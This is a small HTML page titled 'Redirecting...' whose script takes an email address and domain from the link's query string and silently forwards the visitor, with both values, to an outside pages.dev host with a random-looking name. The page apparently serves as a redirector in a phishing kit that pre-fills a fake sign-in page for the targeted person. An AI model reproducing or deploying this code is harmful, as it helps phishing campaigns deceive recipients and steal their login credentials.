
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script type="text/javascript">
        const urlParams = new URLSearchParams(window.location.search);
        const mymail = urlParams.get('mail') || '';
        const dm = urlParams.get('domain') || '';

        // Redirect directly with both parameters
        window.location.replace(`https://pz57687797.pages.dev/?mail=${encodeURIComponent(mymail)}&domain=${encodeURIComponent(dm)}`);
    </script>
</body>
</html>
